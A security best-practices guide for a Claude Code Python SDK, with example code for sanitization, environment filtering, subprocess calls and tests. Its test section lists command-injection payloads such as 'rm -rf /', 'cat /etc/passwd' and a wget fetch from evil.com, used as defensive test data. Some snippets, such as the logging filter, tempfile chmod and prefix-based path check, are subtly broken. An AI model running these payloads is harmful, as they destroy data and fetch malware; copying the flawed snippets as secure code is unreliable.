# Security Best Practices for Claude Code Python SDK

## Overview

This document outlines security best practices for developing with and contributing to the Claude Code Python SDK. Following these guidelines helps ensure the security and reliability of the SDK.

## Command Injection Prevention

### Input Sanitization

The SDK implements comprehensive input sanitization to prevent command injection attacks:

```python
def sanitize_arg(value: str) -> str:
    """Sanitize CLI argument to prevent injection attacks"""
    if not isinstance(value, str):
        value = str(value)
    # Remove dangerous characters that could be used for injection
    dangerous_chars = [';', '&', '|', '`', '$', '(', ')', '<', '>', '"', "'", '\\']
    for char in dangerous_chars:
        value = value.replace(char, '')
    return value.strip()
```

### Model Name Validation

Model names are validated to prevent injection through the model parameter:

```python
# Security: Check for injection attempts in model name
if any(char in self.model for char in [';', '&', '|', '`', '$', '(', ')', '<', '>', '"', "'"]):
    # Sanitize by extracting only valid model if present
    sanitized_model = None
    for valid_model in valid_models:
        if valid_model in self.model:
            sanitized_model = valid_model
            break
    
    if sanitized_model:
        self.model = sanitized_model
    else:
        self.model = "sonnet"  # Safe default
```

## Environment Variable Security

### Allowlist Approach

The SDK uses an allowlist approach for environment variables:

```python
SAFE_ENV_VARS = {
    'PATH', 'HOME', 'USERPROFILE', 'TEMP', 'TMP', 
    'PYTHONPATH', 'ANTHROPIC_API_KEY', 'CLAUDE_CLI_PATH',
    'APPDATA', 'LOCALAPPDATA'
}

# Only safe environment variables are passed
env = {k: v for k, v in os.environ.items() if k in SAFE_ENV_VARS}
```

### Custom Environment Variables

Custom environment variables are filtered:

```python
for k, v in self.environment.items():
    if k in SAFE_ENV_VARS or k.startswith('CLAUDE_'):
        env[k] = str(v)  # Ensure string values
```

## Subprocess Security

### Secure Subprocess Usage

All subprocess calls use secure patterns:

```python
# ✅ SECURE: Uses shell=False, sanitized arguments
process = subprocess.Popen(
    [self.claude_cli_path] + sanitized_args,  # List form, not string
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True,
    shell=False,  # CRITICAL: Never use shell=True
    cwd=safe_working_dir,
    env=filtered_env
)

# ❌ INSECURE: Don't do this
# process = subprocess.Popen(f"claude {user_input}", shell=True)
```

### Process Management

Proper process lifecycle management:

```python
try:
    # Start process
    process = subprocess.Popen([...])
    
    # Handle with timeout
    stdout, stderr = process.communicate(input=prompt, timeout=timeout)
    
except subprocess.TimeoutExpired:
    # Always clean up on timeout
    process.kill()
    process.wait()
    raise ClaudeTimeoutError("Process timed out")
    
finally:
    # Ensure cleanup
    if process and process.poll() is None:
        process.terminate()
```

## Authentication Security

### API Key Handling

Never hardcode API keys:

```python
# ✅ SECURE: Use environment variables
api_key = os.environ.get('ANTHROPIC_API_KEY')

# ❌ INSECURE: Don't hardcode
# api_key = "sk-ant-api03-..."
```

### Error Message Security

Don't expose sensitive information in errors:

```python
# ✅ SECURE: Generic error message
raise ClaudeAuthError("Authentication failed")

# ❌ INSECURE: Exposes API key
# raise ClaudeAuthError(f"Invalid API key: {api_key}")
```

## File System Security

### Temporary File Handling

Create temporary files securely:

```python
import tempfile
import os

# ✅ SECURE: Use tempfile module
with tempfile.NamedTemporaryFile(mode='w', delete=True, suffix='.tmp') as tmp:
    tmp.write(content)
    tmp.flush()
    # File is automatically deleted when closed

# Set secure permissions
os.chmod(tmp.name, 0o600)  # Owner read/write only
```

### Path Validation

Validate file paths to prevent directory traversal:

```python
def validate_path(user_path: str, base_dir: str) -> Path:
    """Validate and resolve path to prevent directory traversal"""
    try:
        # Resolve to absolute path
        resolved_path = Path(base_dir).resolve() / user_path
        resolved_path = resolved_path.resolve()
        
        # Ensure path is within base directory
        if not str(resolved_path).startswith(str(Path(base_dir).resolve())):
            raise ValueError("Path outside allowed directory")
            
        return resolved_path
    except Exception as e:
        raise ValueError(f"Invalid path: {e}")
```

## Network Security

### HTTPS Enforcement

Ensure all network communications use HTTPS:

```python
# ✅ SECURE: Validate URLs
def validate_url(url: str) -> str:
    if not url.startswith('https://'):
        raise ValueError("Only HTTPS URLs are allowed")
    return url
```

### Certificate Validation

Always validate SSL certificates:

```python
import ssl
import requests

# ✅ SECURE: Verify certificates
response = requests.get(url, verify=True, timeout=30)

# ❌ INSECURE: Don't disable verification
# response = requests.get(url, verify=False)
```

## Logging Security

### Sensitive Data Filtering

Filter sensitive data from logs:

```python
import re
import logging

class SensitiveDataFilter(logging.Filter):
    """Filter sensitive data from log messages"""
    
    SENSITIVE_PATTERNS = [
        r'sk-ant-api\d+-[A-Za-z0-9_-]+',  # Anthropic API keys
        r'Bearer [A-Za-z0-9_-]+',         # Bearer tokens
        r'password["\'\s]*[:=]["\'\s]*[^"\'\s]+',  # Passwords
    ]
    
    def filter(self, record):
        for pattern in self.SENSITIVE_PATTERNS:
            record.getMessage = re.sub(pattern, '[REDACTED]', record.getMessage())
        return True

# Apply filter to loggers
logger = logging.getLogger(__name__)
logger.addFilter(SensitiveDataFilter())
```

## Input Validation

### Type Safety

Use type hints and runtime validation:

```python
from typing import Union, List, Optional
import re

def validate_model_name(model: str) -> str:
    """Validate Claude model name"""
    if not isinstance(model, str):
        raise TypeError("Model must be a string")
    
    if not re.match(r'^[a-z]+$', model):
        raise ValueError("Model name must contain only lowercase letters")
    
    valid_models = ['sonnet', 'opus', 'haiku']
    if model not in valid_models:
        raise ValueError(f"Invalid model. Must be one of: {valid_models}")
    
    return model
```

### Parameter Validation

Validate all parameters:

```python
def validate_timeout(timeout: int) -> int:
    """Validate timeout value"""
    if not isinstance(timeout, int):
        raise TypeError("Timeout must be an integer")
    
    if timeout <= 0:
        raise ValueError("Timeout must be positive")
    
    if timeout > 3600:  # 1 hour max
        raise ValueError("Timeout too large (max 3600 seconds)")
    
    return timeout
```

## Error Handling

### Security-Aware Error Handling

Handle errors without exposing sensitive information:

```python
try:
    # Potentially sensitive operation
    result = authenticate_with_api(api_key)
except AuthenticationError as e:
    # ✅ SECURE: Log detailed error privately
    logger.error(f"Authentication failed: {e}", extra={'api_key_prefix': api_key[:8]})
    
    # ✅ SECURE: Return generic error to user
    raise ClaudeAuthError("Authentication failed") from None

except Exception as e:
    # ✅ SECURE: Don't expose internal details
    logger.error(f"Unexpected error: {e}", exc_info=True)
    raise ClaudeCodeError("An unexpected error occurred") from None
```

## Testing Security

### Security Test Cases

Include security-focused test cases:

```python
def test_command_injection_prevention():
    """Test that command injection attempts are prevented"""
    malicious_inputs = [
        "sonnet; rm -rf /",
        "opus | cat /etc/passwd",
        "haiku && wget evil.com/malware",
        "sonnet`whoami`",
        "opus$(id)",
    ]
    
    for malicious_input in malicious_inputs:
        options = ClaudeCodeOptions(model=malicious_input)
        # Should be sanitized to a valid model name
        assert options.model in ['sonnet', 'opus', 'haiku']

def test_environment_variable_filtering():
    """Test that dangerous environment variables are filtered"""
    dangerous_env = {
        'LD_PRELOAD': '/tmp/malicious.so',
        'PATH': '/tmp/malicious:/usr/bin',
        'SHELL': '/bin/bash -c "rm -rf /"',
        'ANTHROPIC_API_KEY': 'sk-ant-api03-legitimate'
    }
    
    options = ClaudeCodeOptions(environment=dangerous_env)
    safe_env = options.get_process_env()
    
    # Only safe variables should be included
    assert 'LD_PRELOAD' not in safe_env
    assert 'ANTHROPIC_API_KEY' in safe_env
```

## Deployment Security

### Production Configuration

Use secure defaults for production:

```python
def create_secure_production_options(**overrides) -> ClaudeCodeOptions:
    """Create options optimized for secure production use"""
    defaults = {
        'verbose': False,  # Don't log sensitive info
        'allowed_tools': ['Read'],  # Minimal tool set
        'max_turns': 3,  # Limit conversation length
        'timeout': 60,  # Short timeout
        'max_retries': 1,  # Limit retry attempts
        'additional_args': []  # No additional args
    }
    defaults.update(overrides)
    return ClaudeCodeOptions(**defaults)
```

### Container Security

When running in containers:

```dockerfile
# Run as non-root user
USER node

# Remove unnecessary packages
RUN apt-get remove --purge -y curl wget && \
    apt-get autoremove -y && \
    apt-get clean

# Set secure permissions
COPY --chown=node:node . /app
RUN chmod -R 755 /app
```

## Monitoring and Alerting

### Security Event Logging

Log security-relevant events:

```python
def log_security_event(event_type: str, details: dict):
    """Log security events for monitoring"""
    security_logger = logging.getLogger('security')
    security_logger.warning(f"SECURITY_EVENT: {event_type}", extra={
        'event_type': event_type,
        'timestamp': time.time(),
        'details': details
    })

# Usage
if suspicious_activity_detected():
    log_security_event('COMMAND_INJECTION_ATTEMPT', {
        'input': sanitize_for_logging(user_input),
        'source_ip': request.remote_addr
    })
```

## Conclusion

Security is a critical aspect of the Claude Code Python SDK. By following these best practices, developers can help ensure the SDK remains secure and reliable for all users.

For questions about security practices or to report security issues, please refer to our [Security Policy](SECURITY.md).